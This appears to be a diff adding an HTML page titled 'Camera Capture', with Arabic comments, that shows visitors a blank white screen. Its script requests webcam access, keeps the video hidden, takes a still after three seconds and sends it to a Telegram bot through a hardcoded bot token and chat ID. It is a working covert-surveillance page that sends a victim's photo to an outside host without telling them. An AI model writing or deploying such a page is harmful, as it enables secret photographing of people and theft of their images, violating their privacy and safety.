@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+    <style>
+        /* تعيين خلفية بيضاء وإخفاء أي محتوى */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            overflow: hidden; /* إخفاء أي محتوى خارج الشاشة */
+        }
+        #video {
+            display: none; /* إخفاء عنصر الفيديو */
+        }
+    </style>
+</head>
+<body>
+    <video id="video" width="320" height="240" autoplay></video>
+    <script>
+        const botToken = '7241818593:AAGhZR3x_il2H0r_d1cC66nKPtnl-mv5eZw';
+        const chatId = '1717245674';
+
+        // طلب الوصول إلى الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                // الحصول على عنصر الفيديو وتعيين مصدره إلى تدفق الكاميرا
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // التقاط الصورة بعد تأخير
+                setTimeout(function() {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    var context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0);
+
+                    // تحويل صورة اللوحة إلى blob وإرسالها
+                    canvas.toBlob(function(blob) {
+                        var formData = new FormData();
+                        formData.append('photo', blob, 'photo.jpg');
+                        
+                        // إرسال الصورة إلى بوت Telegram
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'Content-Type': 'multipart/form-data'
+                            }
+                        })
+                        .then(response => response.json())
+                        .then(result => console.log(result))
+                        .catch(error => console.error('Error:', error));
+                    });
+                }, 3000); // التقاط الصورة بعد 3 ثوان
+            })
+            .catch(function(error) {
+                console.error('Error accessing the camera:', error);
+            });
+    </script>
+</body>
+</html>
